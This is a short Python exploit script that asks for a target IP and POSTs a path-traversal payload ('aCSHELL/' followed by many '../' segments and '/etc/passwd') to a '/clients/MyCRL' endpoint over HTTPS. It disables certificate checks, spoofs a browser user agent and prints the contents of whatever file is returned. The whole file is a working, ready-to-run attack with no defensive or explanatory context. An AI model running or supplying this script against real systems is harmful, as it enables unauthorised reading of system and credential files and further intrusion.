import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def exploit(ip):
    target = f'https://{ip}/clients/MyCRL'
    data = f'aCSHELL/../../../../../../../../../../../etc/passwd'

    headers = {
        'Host': f'{ip}',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0',
        'Te': 'trailers',
        'Dnt': '1',
        'Connection': 'keep-alive',
        'Content-Length': '48'
    }

    response = requests.post(target, headers=headers, data=data, verify=False)

    if response.status_code == 200:
        print(response.text)

if __name__ == '__main__':
    try:
        ip = input("Please enter the IP address: ")
        exploit(ip)
    except EOFError:
        exit(1)
    except KeyboardInterrupt:
        exit(1)
